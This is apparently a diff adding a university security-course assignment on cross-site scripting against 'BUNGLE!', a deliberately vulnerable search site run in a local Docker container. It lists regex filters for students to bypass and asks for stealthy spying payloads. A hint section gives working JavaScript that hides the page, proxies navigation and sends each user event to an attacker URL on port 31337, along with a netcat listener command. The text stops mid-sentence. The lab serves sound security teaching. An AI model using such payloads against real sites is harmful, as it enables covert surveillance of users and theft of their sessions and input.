@@ -1,0 +1,98 @@
+GUIDELINES
+
+A startup named BUNGLE! is about to launch its first product—a web search engine—but their investors are nervous about security problems. Unlike the Bunglers who developed the site, you took CS357, so the investors have hired you to perform a security evaluation before it goes live.
+
+BUNGLE! is available for you to use and run in a docker container. Please come to office hours if you need help installing or running the container.
+
+Registery: https://hub.docker.com/r/honbu/bungle
+
+You can see this tutorial to set up Docker and Bungle: How to Download and Run Bungle
+
+The site is written in Python using the Bottle web framework. Although Bottle has built-in mechanisms that help guard against some common vulnerabilities, the Bunglers have circumvented or ignored these mechanisms in several places. If you wish, you can download and inspect the Python source code at https://www.eecs.umich.edu/courses/eecs388/static/388-f13-proj2.tar.gz, but this is not necessary to complete the project.
+
+In addition to providing search results, the site accepts logins and tracks users’ search histories. It stores usernames, passwords, and search history in a MySQL database.
+
+Before being granted access to the source code, you reverse engineered the site and determined that it replies to five main URLs: /, /search, /login, /logout, and /create. The function of these URLs is explained below, but if you want an additional challenge, you can skip the rest of this section and do the reverse engineering yourself.
+
+Main page (/) The main page accepts GET requests and displays a search form. When submitted, this form issues a GET request to /search, sending the search string as the parameter “q”. If no user is logged in, the main page also displays a form that gives the user the option of logging in or creating an account. The form issues POST requests to /login and /create.
+
+Search results (/search) The search results page accepts GET requests and prints the search string, supplied in the “q” query parameter, along with the search results. If the user is logged in, the page also displays the user’s recent search history in a sidebar. Note: Since actual search is not relevant to this project, you might not receive any results.
+
+Login handler (/login) The login handler accepts POST requests and takes plaintext “username” and “password” query parameters. It checks the user database to see if a user with those credentials exists. If so, it sets a login cookie and redirects the browser to the main page. The cookie tracks which user is logged in; manipulating or forging it is not part of this project.
+
+Logout handler (/logout) The logout handler accepts POST requests. It deletes the login cookie, if set, and redirects the browser to the main page.
+
+Create account handler (/create) The create account handler accepts POST requests and receives plaintext “username” and “password” query parameters. It inserts the username and 3password into the database of users, unless a user with that username already exists. It then logs the user in and redirects the browser to the main page. Note: The password is neither sent nor stored securely; however, none of the attacks you implement should depend on this behavior. You should choose a password that other groups will not guess, but never use an important password to test an insecure site!
+
+
+ASSIGNMENT
+
+Part 3. Cross-site Scripting (XSS) 
+Your final goal is to demonstrate XSS attacks against the BUNGLE! search box, which does not properly filter search terms before echoing them to the results page. For each of the defenses below, your goal is to construct a URL that, if loaded in the victim’s browser, correctly executes the payload specified below. We recommend that you begin by testing with a simple payload (e.g., alert(0);), then move on to the full payload. Note that you should be able to implement the payload once, then use different means of encoding it to bypass the different defenses.
+
+Payload 
+The payload (the code that the attack tries to execute) will be an extended form of spying and password theft. After the victim visits the URL you create, all functions of the BUNGLE! site should be under control of your code and should report what the user is doing to a server you control, until the user leaves the site. Your payload needs to accomplish these goals:
+
+Stealth:
+• Display all pages correctly, with no significant evidence of attack. (Minor text formatting glitches are acceptable.)
+• Display normal URLs in the browser’s location bar, with no evidence of attack. (Hint: Learn about the HTML5 History API.)
+• Hide evidence of attack in the BUNGLE! search history view, as long as your code is running.
+
+Spying: Please see this google doc: Part 2 and 3 FAQ to see what we are expecting when it comes to using "netcat" and spying. We just want you to report back to the netcat server the request.
+
+Defenses
+There are five levels of defense. In each case, you should submit the simplest attack you can find that works against that defense; you should not simply attack the highest level and submit your solution for that level for every level. Try to use a different technique for each defense. The Python code that implements each defense is shown below, along with the target URL and the filename you should submit. 
+The "netcat" command is only needed for 3.1 onwards, NOT 3.0
+
+3.0 No Defenses and Cookie Flags
+Part a: Start with a basic attack where the payload produces an alert box containing the cookie described in section 2.1.
+Target: http://localhost/project2/search?xssdefense=0&csrfdefense=1
+
+Part b: Repeat the attack for the same cookie, but with the ‘HTTPOnly‘ flag enabled.
+Target: http://localhost/project2/search?xssdefense=0&csrfdefense=2
+
+Part c: Repeat the attack for the same cookie, but with the ‘Secure‘ flag enabled.
+Target: http://localhost/project2/search?xssdefense=0&csrfdefense=3
+
+Submission: xss_0.html and xss_0.txt
+
+No Spying is needed for 3.0 See “Massive Hint” below for an example.
+
+3.1 Remove “scr” filtered = re.sub(r"(?i)scr", "", input) 
+Target: http://localhost/project2/search?xssdefense=1 
+Submission: xss_1.html
+
+3.2 Remove several tags filtered = re.sub(r"(?i)script|<img|<body|<style|<meta|<embed|<object", "", input) 
+Target: http://localhost/project2/search?xssdefense=2 
+Submission: xss_2.html
+
+3.3 Remove some punctuation [Extra credit] filtered = re.sub(r"[;’\"]", "", input)
+Target: http://localhost/project2/search?xssdefense=3
+
+What to submit
+Your submission for each level of defense will be a text file with the specified f ilename that contains a single line consisting of a URL. When this URL is loaded in a victim’s browser, it should execute the specified payload against the specified target. The payload encoded in your URLs must be self-contained, but they may embed CSS and JavaScript. Your payload may also load jQuery from the URL http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js. In your submission, also include the HTML file used to generate the URL. Make sure you test your solutions in FireFox, Internet Explorer, or Safari (preferably FireFox). For 3.0 only, include an explanation in your text file explaining why the attack succeeds or fails under the different flag configurations.Submission: xss_3.html
+
+Text files, each containing a URL that, when loaded in a browser, immediately carries out the specified XSS attack against the specified target. Include in the text file for 3.0 an explanation on why the attack in part a succeeds or fails for parts b and c. Also submit an HTML file containing the human readable code you used to generate the URL. xss_0.html 3.0 Nodefenses and cookie Flags 
+xss_0.txt 
+xss_1.html 
+xss_1.txt 
+xss_2.html 
+xss_2.txt 
+xss_3.html* 
+xss_3.txt*
+
+
+HINT
+<!-- Derived from jhalderm’s solution to Part 3.--> <meta charset="utf-8"> <script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script> <script> // Extend this function: function payload(attacker) { function log(data) { console.log($.param(data)) $.get(attacker, data); } function proxy(href) { $("html").load(href, function(){ $("html").show(); log({event: "nav", uri: href}); $("#query").val("pwned!"); }); } $("html").hide(); proxy("./"); } function makeLink(csrfdefense, xssdefense, target, attacker) { if (xssdefense == 0) { return target + "./search?xssdefense=" + xssdefense.toString() + "&csrfdefense=" + csrfdefense.toString() + "&q=" + encodeURIComponent("<script" + ">" + payload.toString() + ";payload(\"" + attacker + "\");</script" + ">"); } else { // Implement code to defeat XSS defenses here. } } var csrfdefense = 1; var xssdefense = 0; var target = "http://localhost/project2/"; var attacker = "http://localhost:31337/"; $(function() { var url = makeLink(csrfdefense, xssdefense, target, attacker); $("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>"); }); </script> <h3></h3>
+
+
+SPYING
+
+What do we mean by spying?
+For tasks 3.1 and onwards, you should use netcat as your “server” and you should receive reports on what the user is doing until the user leaves the site. 
+See below on how to set up netcat:
+Make sure you have netcat installed (also part of nmap)
+Run the command ncat -lp 31337
+-l tells netcat to listen
+-p 31337 means that we are listening on port 31337
+A successful attack & “spying” looks something like:
